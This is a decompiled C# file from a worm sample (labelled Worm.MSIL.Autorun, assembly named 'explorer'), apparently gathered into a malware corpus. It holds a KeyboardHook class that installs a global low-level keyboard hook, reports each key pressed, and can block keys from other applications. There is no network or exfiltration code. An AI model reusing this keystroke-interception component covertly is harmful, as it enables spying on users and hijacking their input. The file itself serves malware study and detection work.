// Decompiled with JetBrains decompiler
// Type: KeyboardHook
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Windows.Forms;

public class KeyboardHook : IDisposable
{
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYUP = 257;
  private const int WM_SYSKEYUP = 261;
  private const int VK_SHIFT = 16;
  private const int VK_CONTROL = 17;
  private const int VK_MENU = 18;
  private const int VK_CAPITAL = 20;
  private bool PassAllKeysToNextApp;
  private bool AllowAltTab;
  private bool AllowWindowsKey;
  private KeyboardHook.HookHandlerDelegate proc;
  private IntPtr hookID = IntPtr.Zero;

  public event KeyboardHook.KeyboardHookEventHandler KeyIntercepted;

  public KeyboardHook()
  {
    this.proc = new KeyboardHook.HookHandlerDelegate(this.HookCallback);
    using (Process currentProcess = Process.GetCurrentProcess())
    {
      using (ProcessModule mainModule = currentProcess.MainModule)
        this.hookID = KeyboardHook.NativeMethods.SetWindowsHookEx(13, this.proc, KeyboardHook.NativeMethods.GetModuleHandle(mainModule.ModuleName), 0U);
    }
  }

  public KeyboardHook(string param)
    : this()
  {
    if (string.IsNullOrEmpty(param) || !Enum.IsDefined(typeof (KeyboardHook.Parameters), (object) param))
      return;
    this.SetParameters((KeyboardHook.Parameters) Enum.Parse(typeof (KeyboardHook.Parameters), param));
  }

  public KeyboardHook(KeyboardHook.Parameters param)
    : this()
  {
    this.SetParameters(param);
  }

  private void SetParameters(KeyboardHook.Parameters param)
  {
    switch (param)
    {
      case KeyboardHook.Parameters.AllowAltTab:
        this.AllowAltTab = true;
        break;
      case KeyboardHook.Parameters.AllowWindowsKey:
        this.AllowWindowsKey = true;
        break;
      case KeyboardHook.Parameters.AllowAltTabAndWindows:
        this.AllowAltTab = true;
        this.AllowWindowsKey = true;
        break;
      case KeyboardHook.Parameters.PassAllKeysToNextApp:
        this.PassAllKeysToNextApp = true;
        break;
    }
  }

  private void CheckModifiers()
  {
    StringBuilder stringBuilder = new StringBuilder();
    if (((int) KeyboardHook.NativeMethods.GetKeyState(20) & 1) != 0)
      stringBuilder.AppendLine("Capslock is enabled.");
    if (((int) KeyboardHook.NativeMethods.GetKeyState(16) & 32768) != 0)
      stringBuilder.AppendLine("Shift is pressed.");
    if (((int) KeyboardHook.NativeMethods.GetKeyState(17) & 32768) != 0)
      stringBuilder.AppendLine("Control is pressed.");
    if (((int) KeyboardHook.NativeMethods.GetKeyState(18) & 32768) != 0)
      stringBuilder.AppendLine("Alt is pressed.");
    Console.WriteLine(stringBuilder.ToString());
  }

  private IntPtr HookCallback(
    int nCode,
    IntPtr wParam,
    ref KeyboardHook.KBDLLHOOKSTRUCT lParam)
  {
    bool evtPassThrough = this.PassAllKeysToNextApp;
    if (nCode >= 0)
    {
      if (wParam == (IntPtr) 257 || wParam == (IntPtr) 261)
      {
        if (lParam.vkCode < 160 || lParam.vkCode > 164)
          this.CheckModifiers();
        if (this.AllowWindowsKey)
        {
          switch (lParam.flags)
          {
            case 0:
              if (lParam.vkCode == 27)
              {
                evtPassThrough = true;
                break;
              }
              break;
            case 1:
              if (lParam.vkCode == 91 || lParam.vkCode == 92)
              {
                evtPassThrough = true;
                break;
              }
              break;
          }
        }
        if (this.AllowAltTab && lParam.flags == 32 && lParam.vkCode == 9)
          evtPassThrough = true;
        this.OnKeyIntercepted(new KeyboardHook.KeyboardHookEventArgs(lParam.vkCode, evtPassThrough));
      }
      if (!evtPassThrough)
        return (IntPtr) 1;
    }
    return KeyboardHook.NativeMethods.CallNextHookEx(this.hookID, nCode, wParam, ref lParam);
  }

  public void OnKeyIntercepted(KeyboardHook.KeyboardHookEventArgs e)
  {
    if (this.KeyIntercepted == null)
      return;
    this.KeyIntercepted(e);
  }

  public void Dispose() => KeyboardHook.NativeMethods.UnhookWindowsHookEx(this.hookID);

  public enum Parameters
  {
    None,
    AllowAltTab,
    AllowWindowsKey,
    AllowAltTabAndWindows,
    PassAllKeysToNextApp,
  }

  internal delegate IntPtr HookHandlerDelegate(
    int nCode,
    IntPtr wParam,
    ref KeyboardHook.KBDLLHOOKSTRUCT lParam);

  internal struct KBDLLHOOKSTRUCT
  {
    public int vkCode;
    private int scanCode;
    public int flags;
    private int time;
    private int dwExtraInfo;
  }

  public delegate void KeyboardHookEventHandler(KeyboardHook.KeyboardHookEventArgs e);

  public class KeyboardHookEventArgs : EventArgs
  {
    private string keyName;
    private int keyCode;
    private bool passThrough;

    public string KeyName => this.keyName;

    public int KeyCode => this.keyCode;

    public bool PassThrough => this.passThrough;

    public KeyboardHookEventArgs(int evtKeyCode, bool evtPassThrough)
    {
      this.keyName = ((Keys) evtKeyCode).ToString();
      this.keyCode = evtKeyCode;
      this.passThrough = evtPassThrough;
    }
  }

  [SuppressUnmanagedCodeSecurity]
  [ComVisible(false)]
  internal class NativeMethods
  {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(
      int idHook,
      KeyboardHook.HookHandlerDelegate lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      ref KeyboardHook.KBDLLHOOKSTRUCT lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern short GetKeyState(int keyCode);
  }
}
